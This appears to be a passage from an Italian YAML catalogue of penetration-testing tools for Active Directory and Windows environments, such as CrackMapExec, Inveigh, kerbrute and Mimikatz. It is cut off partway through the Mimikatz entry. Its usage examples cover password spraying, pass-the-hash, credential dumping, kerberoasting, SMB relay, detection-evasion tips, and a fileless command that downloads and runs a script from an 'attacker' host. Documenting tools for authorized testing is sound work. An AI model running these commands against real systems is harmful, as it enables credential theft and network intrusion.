- id: "metasploit-pentest-plugin"
  name: "Pentest-plugin"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "metasploit"
  phases: ["00_Common"]
  caps: ["automation", "workspace", "import-export", "loot-triage"]
  repo: "https://github.com/darkoperator/Metasploit-Plugins"
  desc: "Plugin Metasploit per automazione discovery, auto-exploitation da report
    scanner, post-exploitation multi-sessione e gestione progetti con logging strutturato"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>Il plugin <strong>Pentest</strong>
    di darkoperator estende Metasploit Framework con capacità di automazione operativa
    pensate per ridurre le operazioni ripetitive durante engagement complessi. Integra
    comandi per discovery di rete, correlazione automatica di vulnerabilità da report
    esterni e orchestrazione di moduli post-exploitation su sessioni multiple.</p><h4
    class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-exploitation:</strong>
    Il comando <code>auto_exploit</code> importa risultati da scanner di vulnerabilità
    (Nessus, Qualys, OpenVAS) e lancia automaticamente moduli Metasploit correlati.
    Supporta anche l'identificazione di vettori client-side tramite <code>show_client_side</code>
    e <code>vuln_exploit</code> per exploitation mirata.</p><p><strong>Discovery:</strong>
    Include <code>network_discover</code> per enumerazione attiva, <code>discover_db</code>
    per interrogare il database workspace e funzioni di pivot discovery via sessioni
    Meterpreter per esplorare segmenti interni.</p><p><strong>Post-automation:</strong>
    I comandi <code>multi_cmd</code>, <code>multi_meter_cmd</code> e <code>multi_post</code>
    consentono di eseguire comandi o moduli post su multiple sessioni contemporaneamente.
    <code>app_creds</code> e <code>sys_creds</code> estraggono credenziali applicative
    e di sistema in batch.</p><p><strong>Project management:</strong> Crea e gestisce
    progetti basati su workspace con export completo dei dati, logging cronologico
    di tutte le azioni e supporto per archiviazione/import in altri tool.</p><h4 class=\"\
    rt-green\">Utilizzo</h4><p>Caricare il plugin: <code>msf> load pentest</code><br>Verificare
    opzioni: <code>msf> auto_exploit -h</code><br>Gestire progetti: <code>msf> project
    -h</code></p><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li>Triage rapido da report
    di vulnerability scanner con exploitation automatica mirata</li><li>Coordinamento
    di azioni post-exploitation su decine di sessioni attive</li><li>Standardizzazione
    della raccolta di evidenze e artefatti per reporting</li></ul><h4 class=\"rt-red\"\
    >Considerazioni OPSEC</h4><ul><li>Limitare lo scope dell'auto-exploitation a host/servizi
    autorizzati</li><li>Operare durante finestre di change concordate per ridurre
    impatto</li><li>Utilizzare workspace separati per ciascun progetto ed esportare
    archivi firmati</li></ul>"
  best_in: false
  category_path: ["00_Common", "Metasploit_Plugins"]
  notes:

- id: "scipag-vulscan"
  name: "Vulscan"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "nmap"
  phases: ["00_Common"]
  caps: ["service-detection", "vuln-mapping", "cve-correlation"]
  repo: "https://github.com/scipag/vulscan"
  desc: "Modulo NSE per Nmap che converte output di version detection in suggerimenti
    CVE tramite database offline di vulnerabilità"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Vulscan</strong> è uno
    script NSE (Nmap Scripting Engine) sviluppato da SCIP AG che trasforma Nmap in
    uno strumento di vulnerability mapping passivo. Correlando i risultati della version
    detection (<code>-sV</code>) con database offline di vulnerabilità, identifica
    potenziali CVE e exploit applicabili ai servizi rilevati.</p><h4 class=\"rt-purple\"\
    >Funzionamento</h4><p>Lo script confronta prodotto e versione di ciascun servizio
    con molteplici database locali:</p><ul><li><strong>scipvuldb.csv</strong> - Database
    VulDB</li><li><strong>cve.csv</strong> - MITRE CVE</li><li><strong>exploitdb.csv</strong>
    - Exploit Database</li><li><strong>osvdb.csv</strong> - Open Source Vulnerability
    Database</li><li><strong>securityfocus.csv</strong> - SecurityFocus BID</li><li><strong>securitytracker.csv</strong>
    - SecurityTracker</li></ul><p>Il matching avviene completamente offline, senza
    richieste esterne, rendendolo ideale per ambienti air-gapped o con connettività
    limitata.</p><h4 class=\"rt-green\">Utilizzo</h4><p><strong>Scansione base:</strong></p><pre><code>nmap
    -sV --script=vulscan/vulscan.nse target.com</code></pre><p><strong>Database specifico:</strong></p><pre><code>nmap
    -sV --script=vulscan/vulscan.nse --script-args vulscandb=exploitdb.csv target.com</code></pre><p><strong>Aggiornamento
    database:</strong><br>Eseguire lo script <code>update.sh</code> nella directory
    vulscan per scaricare gli ultimi CSV.</p><h4 class=\"rt-amber\">Best practice</h4><ul><li>Utilizzare
    come triage rapido prima di vulnerability scanner più pesanti (Nessus, OpenVAS)</li><li>Aggiornare
    regolarmente i database CSV per risultati affidabili</li><li>Filtrare i risultati
    per prioritizzare servizi esposti su Internet</li><li>Integrare in pipeline di
    discovery automatizzata per ridurre tempi di recon</li></ul><h4 class=\"rt-red\"\
    >Limitazioni</h4><p>I risultati sono suggerimenti basati su pattern nome/versione
    e richiedono validazione manuale. False positive possono verificarsi con backport
    di patch o versioni custom. Non sostituisce scanner di vulnerabilità completi
    ma accelera la fase di prioritizzazione.</p>"
  best_in: false
  category_path: ["00_Common", "Scripts"]
  notes:

- id: "adrecon"
  name: "ADRecon"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["ad-inventory", "reporting", "risk-overview"]
  repo: "https://github.com/sense-of-security/ADRecon"
  desc: "Tool PowerShell per raccolta completa di artefatti Active Directory (trust,
    GPO, deleghe, utenti privilegiati) con report Excel strutturati"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ADRecon</strong> è uno
    strumento di enumerazione Active Directory che genera report dettagliati dell'infrastruttura
    Windows enterprise. Raccoglie informazioni da forest, domain, domain controller,
    configurazioni di sicurezza, utenti, gruppi, GPO, DNS e computer, producendo un
    workbook Excel con metriche aggregate e viste riassuntive.</p><h4 class=\"rt-purple\"\
    >Capacità di raccolta</h4><p>Il tool interroga Active Directory via LDAP e RSAT
    (dove disponibili) per estrarre:</p><ul><li><strong>Forest/Domain:</strong> Trust,
    livelli funzionali, configurazioni globali</li><li><strong>Domain Controllers:</strong>
    Ruoli FSMO, configurazioni SMB signing</li><li><strong>Utenti/Gruppi:</strong>
    Account privilegiati, membership, SPN</li><li><strong>OU e GPO:</strong> Struttura
    organizzativa, Group Policy Object e gPLink</li><li><strong>Deleghe:</strong>
    Deleghe Kerberos constrained/unconstrained</li><li><strong>DNS:</strong> Zone
    e record</li><li><strong>Computer:</strong> Inventario host joinati al dominio</li></ul></p><h4
    class=\"rt-green\">Modalità di esecuzione</h4><p>ADRecon può operare in diversi
    scenari:</p><ul><li><strong>Da host domain-joined</strong> con credenziali correnti</li><li><strong>Da
    host non joinato</strong> specificando credenziali di dominio</li><li><strong>Con
    utenza low-privilege</strong> per baseline non invasiva</li></ul></p><p><strong>Esempio
    base:</strong></p><pre><code>PS> .\\ADRecon.ps1</code></pre><p><strong>Con credenziali
    specifiche:</strong></p><pre><code>PS> .\\ADRecon.ps1 -DomainController DC01.acme.local
    -Credential (Get-Credential)</code></pre><h4 class=\"rt-amber\">Utilizzo in pentest</h4><ul><li><strong>Pre-exploitation:</strong>
    Baseline iniziale per mappare superfici d'attacco e identificare misconfigurazioni</li><li><strong>Post-exploitation:</strong>
    Due-diligence approfondita per attack path e privilege escalation</li><li>L'output
    strutturato facilita identificazione di trust deboli, deleghe rischiose e GPO
    mal configurate</li></ul><h4 class=\"rt-red\">Note operative</h4><p>Il tool genera
    traffico LDAP significativo visibile nei log dei Domain Controller. Pianificare
    l'esecuzione in finestre concordate e considerare throttling su domini di grandi
    dimensioni. I report Excel possono contenere informazioni sensibili: proteggere
    adeguatamente e limitare la diffusione.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "crackmapexec-win"
  name: "CrackMapExecWin"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["auth-spray", "lateral-movement", "remote-exec", "loot"]
  repo: "https://github.com/maaaaz/CrackMapExecWin"
  desc: "Post-exploitation framework multi-protocol (SMB/WinRM/SSH/LDAP/MSSQL) per
    network sweeping, credential spraying, command execution e module-based attacks"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>CrackMapExec (CME) è Swiss Army
    knife per post-exploitation Windows networks, combinando credential validation,
    enumeration, lateral movement e exploitation in unified interface. Supporta multiple
    protocols, module system extensible e database backend per tracking pwned hosts.
    Usato per rapid network assessment post-compromise, credential validation at scale
    e automated exploitation.</p><h4 class=\"rt-purple\">Core capabilities multi-protocol</h4><p><strong>SMB
    protocol (primary):</strong> Credential validation, command execution (psexec/wmiexec/smbexec/atexec),
    file operations, share enumeration, SAM/LSA/NTDS dumping, session enumeration.</p><p><strong>WinRM
    protocol:</strong> PowerShell remoting-based execution, credential validation,
    command execution via PS remoting, ideal per environments con PSRemoting enabled
    ma SMB restricted.</p><p><strong>LDAP protocol:</strong> AD enumeration senza
    host interaction, user/group/computer queries, bloodhound data collection, password
    policy retrieval.</p><p><strong>MSSQL protocol:</strong> SQL server credential
    validation, xp_cmdshell command execution, linked server enumeration, SQL injection-style
    attacks.</p><p><strong>SSH/FTP protocols:</strong> Linux target support per hybrid
    environments.</p><h4 class=\"rt-green\">Utilizzo operativo esempi</h4><p><strong>Credential
    spraying network-wide:</strong><br><code>crackmapexec smb 192.168.1.0/24 -u administrator
    -p Password123</code><br>Test single credential across entire subnet, identify
    reused local admin passwords.</p><p><strong>Pass-the-hash validation:</strong><br><code>crackmapexec
    smb targets.txt -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c</code><br>Validate
    NTLM hash across multiple hosts from file.</p><p><strong>Command execution sweep:</strong><br><code>crackmapexec
    smb 192.168.1.0/24 -u admin -p pass -x 'whoami'</code><br>Execute command su all
    accessible hosts in subnet.</p><p><strong>SAM dumping multi-host:</strong><br><code>crackmapexec
    smb targets.txt -u admin -p pass --sam</code><br>Extract local account hashes
    da multiple machines.</p><p><strong>Module execution (e.g., mimikatz):</strong><br><code>crackmapexec
    smb 192.168.1.50 -u admin -p pass -M mimikatz</code><br>Run mimikatz module per
    credential extraction.</p><h4 class=\"rt-amber\">Module system e automation</h4><p><strong>Built-in
    modules:</strong> mimikatz (credential dumping), enum_avproducts (AV detection),
    enum_dns (DNS records), lsassy (LSASS dumping), nanodump (indirect LSASS dumping),
    ntdsutil (NTDS extraction), rdp (enable RDP), uac (UAC status check), spider_plus
    (file searching).</p><p><strong>Module chaining workflow:</strong> Enumerate accessible
    hosts → validate credentials → execute enumeration modules → identify high-value
    targets → execute exploitation modules → extract credentials → repeat with new
    credentials (credential cascade).</p><p><strong>Database tracking:</strong> CME
    maintains SQLite database tracking hosts, credentials, pwned status. Query database:
    <code>cmedb</code> interactive shell per review historical access.</p><p><strong>Custom
    module development:</strong> Python-based module system allows custom attack logic,
    integrate organization-specific checks o exploitation techniques.</p><h4 class=\"\
    rt-red\">OPSEC considerations e detection</h4><p>CME è inherently noisy: network
    sweeping genera connection attempts a multiple hosts, triggering EDR alerts, failed
    authentication logs (4625), successful authentications (4624) su many hosts simultaneously.
    Detection signatures: burst SMB connections from single source IP, authentication
    attempts across multiple hosts within short timeframe, characteristic User-Agent
    strings in HTTP-based modules. Evasion strategies: throttle scan speed (--jitter,
    --delay flags), limit concurrent threads, target specific hosts invece broad sweeps,
    use stealthier execution methods (atexec vs psexec). Credential validation generates
    logs: ogni SMB connection attempt logged even se authentication fails, produces
    audit trail su target systems. Operational phasing: initial narrow reconnaissance
    targeting known-accessible hosts, expand scope gradually based on success. Module
    selection impact OPSEC: LSASS dumping (lsassy, nanodump) triggers AV/EDR alerts,
    file searching (spider_plus) generates filesystem access logs, mimikatz module
    highest detection risk. Alternative approaches: use built-in Windows tools via
    command execution invece modules quando stealth paramount. Protocol choice matters:
    WinRM execution can be stealthier than SMB in environments monitoring SMB aggressively,
    LDAP enumeration doesn't touch endpoints directly (lower detection probability).
    CME logging verbose: output contiene passwords in cleartext, secure handling mandatory.
    Credential reuse detection: CME identifies credential reuse patterns across network,
    valuable intelligence ma also indicates poor credential hygiene requiring remediation
    recommendations. Post-engagement cleanup: CME doesn't create persistent artifacts
    oltre authentication logs, but review executed commands per identify potential
    leftover files/changes. Network segmentation assessment: CME rapid feedback su
    which subnets accessible with current credentials, informs network trust boundaries.
    CME actively developed: updates frequent con new modules e protocol support, stay
    current for latest capabilities. Alternative tools: NetExec (fork) provides similar
    functionality con some enhancements, consider based on specific feature needs.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "domainpasswordspray"
  name: "DomainPasswordSpray.ps1"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["password-spraying", "user-enum", "opsec"]
  repo: "https://github.com/dafthack/DomainPasswordSpray"
  desc: "Script PowerShell per password spraying contro domini Active Directory con
    generazione automatica userlist e rispetto delle lockout policy"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DomainPasswordSpray.ps1</strong>
    è uno script PowerShell specializzato per password spraying su Active Directory
    che enfatizza la sicurezza operativa e il rispetto delle policy aziendali. Genera
    automaticamente liste di utenti dal dominio e implementa controlli per evitare
    account lockout.</p><h4 class=\"rt-purple\">Funzionalità chiave</h4><p><strong>Generazione
    automatica userlist:</strong> Interroga Active Directory per estrarre account
    validi, con filtri per escludere:</p><ul><li>Account disabilitati</li><li>Account
    già lockati</li><li>Account con badPwdCount vicino alla soglia di lockout</li></ul></p><p><strong>Rispetto
    lockout policy:</strong> Verifica la Fine Grained Password Policy del dominio
    e adatta il comportamento per evitare di triggerare blocchi account.</p><p><strong>Modalità
    di autenticazione:</strong> Supporta LDAP e Kerberos pre-authentication per la
    validazione credenziali, con opzioni per targeting specifico di Domain Controller.</p><h4
    class=\"rt-green\">Esempi di utilizzo</h4><p><strong>Password singola con userlist
    automatica:</strong></p><pre><code>PS> Invoke-DomainPasswordSpray -Password Spring2025</code></pre><p><strong>Con
    userlist custom:</strong></p><pre><code>PS> Invoke-DomainPasswordSpray -UserList
    users.txt -Password Welcome1!</code></pre><p><strong>Multiple password su dominio
    specifico:</strong></p><pre><code>PS> Invoke-DomainPasswordSpray -Domain acme.local
    -PasswordList passwords.txt -OutFile results.txt</code></pre><p><strong>Quiet
    mode per automation:</strong></p><pre><code>PS> Invoke-DomainPasswordSpray -Password
    Winter2025 -Quiet -OutFile valid-creds.txt</code></pre><h4 class=\"rt-amber\"\
    >Best practice</h4><ul><li>Testare sempre con 1-2 password prima di campagne estese</li><li>Rispettare
    intervalli tra tentativi (minimo 30 minuti tra round)</li><li>Usare password stagionali/comuni
    specifiche per il contesto aziendale</li><li>Limitare scope a OU/gruppi specifici
    quando possibile</li></ul><h4 class=\"rt-red\">Considerazioni di sicurezza</h4><p>Anche
    con protezioni integrate, il password spraying genera eventi 4771 (Kerberos pre-auth
    failed) o 4625 (logon failed) sui Domain Controller. SOC maturi possono rilevare
    pattern anomali. Operare in finestre autorizzate, con scope chiaro e documentazione
    delle attività. L'output contiene credenziali valide: proteggere i file di risultato
    appropriatamente.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "getuserspns-windows"
  name: "GetUserSPNs_windows.exe"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["kerberoasting", "spn-enum"]
  repo: "https://github.com/maaaaz/impacket-examples-windows"
  desc: "Esegue enum SPN utente e richiede TGS per kerberoasting, consentendo cracking
    offline di password di service account su domini AD"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GetUserSPNs_windows.exe</strong>
    è la compilazione Windows del tool Impacket per Kerberoasting. Enumera Service
    Principal Name (SPN) associati ad account utente e richiede TGS (Ticket Granting
    Service) che possono essere crackati offline per recuperare password di service
    account.</p><h4 class=\"rt-purple\">Tecnica di attacco</h4><p>Il Kerberoasting
    sfrutta una caratteristica del protocollo Kerberos: qualsiasi utente di dominio
    autenticato può richiedere TGS per servizi che hanno SPN registrati. Questi ticket
    sono cifrati con l'hash della password del service account e possono essere estratti
    e crackati offline senza generare failed logon events.</p><h4 class=\"rt-green\"\
    >Utilizzo</h4><p><strong>Enumerazione SPN base:</strong></p><pre><code>GetUserSPNs.exe
    -dc-ip 192.168.1.10 acme.local/user:password</code></pre><p><strong>Request TGS
    con export:</strong></p><pre><code>GetUserSPNs.exe -request -dc-ip 192.168.1.10
    -outputfile tgs.txt acme.local/user:password</code></pre><p><strong>Con hash NTLM:</strong></p><pre><code>GetUserSPNs.exe
    -hashes :aad3b435b51404ee... -dc-ip 192.168.1.10 -request acme.local/user</code></pre><p><strong>Targeting
    specifico:</strong></p><pre><code>GetUserSPNs.exe -request -dc-ip 192.168.1.10
    acme.local/user:pass -target-user svc-sql</code></pre><h4 class=\"rt-amber\">Pipeline
    completa</h4><ol><li>Eseguire enum SPN con GetUserSPNs</li><li>Richiedere TGS
    per account interessanti (evitare krbtgt e account computer)</li><li>Estrarre
    ticket in formato Hashcat/John (<code>-format hashcat/john</code>)</li><li>Crack
    offline: <code>hashcat -m 13100 tgs.txt wordlist.txt</code></li><li>Validare credenziali
    recuperate e valutare privilege escalation paths</li></ol><h4 class=\"rt-red\"\
    >Rilevamento e mitigazioni</h4><p>Kerberoasting genera eventi 4769 (TGS requested)
    sui Domain Controller. Difese mature monitorano:</p><ul><li>Richieste massive
    di TGS in breve tempo</li><li>TGS per account con encryption type debole (RC4)</li><li>Richieste
    da host non standard</li></ul><p>Mitigazioni: password lunghe (25+ char) per service
    account, transition a Managed Service Account, monitoring di SPN sensibili.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "group3r"
  name: "Group3r"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["gpo-audit", "misconfig-detection"]
  repo: "https://github.com/Group3r/Group3r"
  desc: "Tool per enum GPO e analisi misconfigurazioni sfruttabili (script, MSI, path
    SYSVOL writeable, ACL deboli) utili ad escalation"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Group3r</strong> è uno
    strumento orientato all'attacco (non audit) per enumerare e analizzare Group Policy
    Object alla ricerca di misconfigurazioni exploitable. A differenza di tool audit-oriented,
    Group3r filtra finding per sfruttabilità immediata, evidenziando path di privilege
    escalation e lateral movement.</p><h4 class=\"rt-purple\">Categorie di finding</h4><p><strong>Script
    e MSI distribuiti:</strong> Identifica script di logon/startup e MSI package deployati
    via GPO che potrebbero essere modificabili o contenere credenziali.</p><p><strong>Path
    SYSVOL writeable:</strong> Rileva percorsi in SYSVOL con ACL deboli dove un attacker
    potrebbe iniettare payload eseguiti al logon utente.</p><p><strong>ACL modificabili:</strong>
    Enumera GPO dove l'attacker ha diritti di modifica (Write, WriteProperty, WriteDacl)
    permettendo injection di configurazioni dannose.</p><p><strong>Credenziali in
    chiaro:</strong> Cerca password in Group Policy Preferences (cpassword), script
    batch/PowerShell e scheduled task.</p><p><strong>Riferimenti a share:</strong>
    Identifica UNC path a file share che potrebbero essere sfruttati per NTLM relay
    o DLL hijacking.</p><h4 class=\"rt-green\">Modalità di esecuzione</h4><p><strong>Scansione
    completa:</strong></p><pre><code>.\\Group3r.exe -f GPO_output.html</code></pre><p><strong>Solo
    finding high severity:</strong></p><pre><code>.\\Group3r.exe -s 4 -f findings.html</code></pre><p><strong>Output
    JSON per parsing:</strong></p><pre><code>.\\Group3r.exe -o json -f results.json</code></pre><p><strong>Modalità
    offline:</strong></p><pre><code>.\\Group3r.exe -g C:\\Path\\To\\GPO\\ -f offline.html</code></pre><h4
    class=\"rt-amber\">Integration in attack path</h4><ul><li>Eseguire dopo initial
    foothold su dominio</li><li>Correlare con output di BloodHound per attack path
    completi</li><li>Prioritizzare GPO con applicazione a gruppi privilegiati</li><li>Testare
    modificabilità effettiva prima di exploitation</li></ul><h4 class=\"rt-red\">Considerazioni
    operative</h4><p>Group3r comunica con Domain Controller via LDAP e accede a SYSVOL
    via SMB, generando traffico rilevabile. L'accesso a SYSVOL con account low-privilege
    è legittimo ma pattern di enumerazione massiva possono alertare SOC. Output reports
    contengono informazioni sensibili: proteggere e limitare diffusione.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "inveigh-exe"
  name: "Inveigh.exe"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["mitm", "llmnr-nbns-mdns", "hash-capture", "relay-support"]
  repo: "https://github.com/Kevin-Robertson/Inveigh"
  desc: "Strumento .NET cross-platform per MITM con spoofing LLMNR/NBNS/mDNS, listener
    HTTP/SMB e cattura hash NetNTLM con supporto relay"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Inveigh.exe</strong>
    è l'implementazione .NET Core di Inveigh, uno strumento completo per Man-in-the-Middle
    su reti Windows. Supporta poisoning di protocolli di risoluzione nome (LLMNR,
    NBNS, mDNS) e listener per catturare challenge-response NetNTLM, con capacità
    di relay avanzate.</p><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Spoofers:</strong><ul><li>LLMNR
    (Link-Local Multicast Name Resolution)</li><li>NBNS (NetBIOS Name Service)</li><li>mDNS
    (multicast DNS)</li><li>DHCPv6 spoofing</li><li>DNS server rogue</li></ul></p><p><strong>Listener:</strong><ul><li>HTTP/HTTPS
    con NTLMv1/v2 authentication</li><li>SMB con firma disabilitata</li><li>LDAP per
    cattura credenziali directory</li><li>WebDAV</li><li>Proxy authentication capture</li></ul></p><p><strong>Capture
    e relay:</strong> Salva NetNTLM challenge/response in formato Hashcat/John e supporta
    relay verso SMB, HTTP, LDAP per escalation.</p><h4 class=\"rt-green\">Esempi operativi</h4><p><strong>LLMNR/NBNS
    poisoning base:</strong></p><pre><code>Inveigh.exe</code></pre><p><strong>Solo
    HTTP listener:</strong></p><pre><code>Inveigh.exe -LLMNR N -NBNS N -HTTP Y</code></pre><p><strong>Con
    filtri dominio:</strong></p><pre><code>Inveigh.exe -SpooferHostsIgnore host1,host2
    -SpooferIPsIgnore 192.168.1.10</code></pre><p><strong>Inspect mode (no spoofing):</strong></p><pre><code>Inveigh.exe
    -Inspect</code></pre><p><strong>Output file:</strong></p><pre><code>Inveigh.exe
    -FileOutput Y -FileOutputDirectory C:\\Temp\\Inveigh</code></pre><h4 class=\"\
    rt-amber\">Scenari d'uso</h4><ul><li>Internal recon per identificare host che
    fallback a LLMNR/NBNS</li><li>Credential harvesting su segmenti non monitorati</li><li>Setup
    per NTLM relay attacks verso target privilegiati</li><li>Validation di security
    posture (LLMNR/NBNS disabilitati?)</li></ul><h4 class=\"rt-red\">OPSEC e rilevamento</h4><p>Spoofing
    genera traffico anomalo rilevabile da NDR/IDS. Risposte rogue a query LLMNR/NBNS
    possono causare disruption di servizi legittimi. Best practice:</p><ul><li>Usare
    ignore lists per escludere host critici</li><li>Limitare durata dell'attacco a
    finestre concordate</li><li>Monitorare console per traffico catturato e fermare
    se eccessivo</li><li>Preferire modalità passiva (Inspect) per baseline prima di
    active poisoning</li></ul><p>SMB signing e LDAP channel binding sono mitigazioni
    efficaci: verificare configurazione target prima di relay attempts.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "inveigh-ps1"
  name: "Inveigh.ps1"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["mitm", "llmnr-nbns-mdns", "hash-capture"]
  repo: "https://github.com/Kevin-Robertson/Inveigh"
  desc: "Versione PowerShell di Inveigh per MITM fileless con spoofing LLMNR/NBNS/mDNS
    e cattura hash NetNTLM in scenari con restrizioni binari"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Inveigh.ps1</strong>
    è la versione PowerShell legacy di Inveigh, ottimizzata per deployment fileless
    e scenari dove l'esecuzione di binari è limitata. Mantiene le funzionalità core
    di poisoning e hash capture con footprint ridotto.</p><h4 class=\"rt-purple\"\
    >Vantaggi deployment PowerShell</h4><ul><li><strong>Fileless execution:</strong>
    Può essere caricato direttamente in memoria senza toccare disco</li><li><strong>Evasion:</strong>
    Meno rilevabile da AV/EDR rispetto a binari .NET</li><li><strong>Integrazione:</strong>
    Facile inclusione in framework post-exploitation (Empire, Covenant)</li><li><strong>Portabilità:</strong>
    Single-file deployment senza dipendenze</li></ul><h4 class=\"rt-green\">Utilizzo</h4><p><strong>Import
    e start base:</strong></p><pre><code>PS> . .\\Inveigh.ps1<br>PS> Invoke-Inveigh</code></pre><p><strong>Parametri
    comuni:</strong></p><pre><code>PS> Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR
    Y -HTTP Y</code></pre><p><strong>Fileless da remoto:</strong></p><pre><code>PS>
    IEX (New-Object Net.WebClient).DownloadString('http://attacker/Inveigh.ps1')<br>PS>
    Invoke-Inveigh -RunTime 30</code></pre><p><strong>Con output file:</strong></p><pre><code>PS>
    Invoke-Inveigh -FileOutput Y -FileOutputDirectory C:\\Temp</code></pre><h4 class=\"\
    rt-amber\">Inveigh-Relay</h4><p>La repo include anche <code>Inveigh-Relay.ps1</code>
    per scenari SMB relay:<br><code>PS> Invoke-InveighRelay -Target 192.168.1.10 -Command
    \"cmd.exe /c whoami > C:\\relay.txt\"</code></p><p>Utile per escalation quando
    SMB signing è disabilitato su host target.</p><h4 class=\"rt-red\">Limitazioni
    e mitigazioni</h4><p><strong>Permessi richiesti:</strong> Amministratore locale
    necessario per sniffing raw sockets e binding porte privilegiate (53, 137, etc.)</p><p><strong>Telemetrie
    difensive:</strong><ul><li>PowerShell logging (module/script block logging) cattura
    l'intero script</li><li>AMSI può rilevare pattern noti in memoria</li><li>Constrained
    Language Mode limita funzionalità reflection</li></ul></p><p><strong>Alternative
    moderne:</strong> Per engagement recenti considerare la versione .NET (Inveigh.exe)
    che offre maggiore stabilità e feature set esteso. Inveigh.ps1 rimane valida per
    quick-ops e ambienti con .NET non disponibile.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "kerbrute-win"
  name: "kerbrute_Windows.exe"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["user-enum", "password-spraying", "kerberos-preauth"]
  repo: "https://github.com/ropnop/kerbrute"
  desc: "Tool Go per user enumeration e password spraying via Kerberos pre-auth a
    basso rumore, evitando traffico SMB/LDAP su domini AD"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>kerbrute_Windows.exe</strong>
    è un tool scritto in Go per user enumeration e password spraying su Active Directory
    che comunica direttamente con il KDC (Key Distribution Center) via protocollo
    Kerberos (porta 88 TCP/UDP), evitando protocolli più rumorosi come SMB e LDAP.</p><h4
    class=\"rt-purple\">Vantaggi operativi</h4><p><strong>Basso profilo:</strong>
    Le richieste AS-REQ verso il KDC sono traffico legittimo e meno monitorate di
    failed logon su SMB. Non genera eventi 4625 (failed logon) ma solo 4768 (TGT requested)
    o 4771 (pre-auth failed).</p><p><strong>Velocità:</strong> Scritto in Go con concorrenza
    nativa, può testare migliaia di username/password rapidamente rispettando rate
    limit configurabili.</p><p><strong>Precision:</strong> AS-REQ fallite con error
    code specifici distinguono account inesistenti da password errate, eliminando
    false positive.</p><h4 class=\"rt-green\">Comandi principali</h4><p><strong>User
    enumeration:</strong></p><pre><code>kerbrute_windows.exe userenum -d acme.local
    --dc 192.168.1.10 users.txt</code></pre><p><strong>Password spraying:</strong></p><pre><code>kerbrute_windows.exe
    passwordspray -d acme.local users.txt Password123! --delay 2s</code></pre><p><strong>Brute
    force (sconsigliato):</strong></p><pre><code>kerbrute_windows.exe bruteuser -d
    acme.local passwords.txt admin --delay 5s</code></pre><p><strong>Con output file:</strong></p><pre><code>kerbrute_windows.exe
    userenum -d acme.local users.txt -o valid-users.txt</code></pre><h4 class=\"rt-amber\"\
    >Best practice</h4><ul><li>Sempre specificare <code>--delay</code> per rispettare
    lockout policy (minimo 1-2 secondi)</li><li>Usare IP diretto del DC con <code>--dc</code>
    per evitare DNS lookup ripetuti</li><li>Limitare concorrenza con <code>-t</code>
    su reti lente o DC sovraccarichi</li><li>Testare prima con piccoli subset per
    validare formato userlist</li><li>Salvare output per correlare con altre fonti
    (BloodHound, LDAP enum)</li></ul><h4 class=\"rt-red\">Rilevamento e mitigazioni</h4><p>SOC
    maturi monitorano:</p><ul><li>Spike di eventi 4771 da singolo IP</li><li>AS-REQ
    con encryption type debole (RC4)</li><li>Pattern temporali anomali (burst vs.
    traffico utente normale)</li></ul><p>Mitigazioni difensive: pre-auth obbligatoria
    per tutti gli account, monitoring 4771, rate limiting a livello firewall/KDC.</p>"
  best_in: false
  category_path: ["00_Common", "Tools_Windows"]
  notes:

- id: "mimikatz"
  name: "Mimikatz"
  version: ""
  icon: "../app/icons/github.svg"
  kind: "windows"
  phases: ["00_Common"]
  caps: ["credential-dumping", "tickets", "pth", "ptt"]
  repo: "https://github.com/gentilkiwi/mimikatz"
  desc: "Toolkit post-exploitation per dump credenziali Windows (LSA/DPAPI/Kerberos),
    Pass-the-Hash/Ticket e generazione Golden/Silver ticket"
  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Mimikatz</strong> di
    Benjamin Delpy è il tool di riferimento per credential dumping e manipolazione
    Kerberos su Windows. Estrae credenziali da memoria, DPAPI, SAM/LSA, manipola ticket
    Kerberos e implementa tecniche avanzate di lateral movement e persistence.</p><h4
    class=\"rt-purple\">Moduli principali</h4><p><strong>sekurlsa:</strong> Estrae
    credenziali da processi LSASS:</p><ul><li><code>sekurlsa::logonpasswords</code>
    - Dump password plaintext/hash/ticket da tutte le sessioni</li><li><code>sekurlsa::ekeys</code>
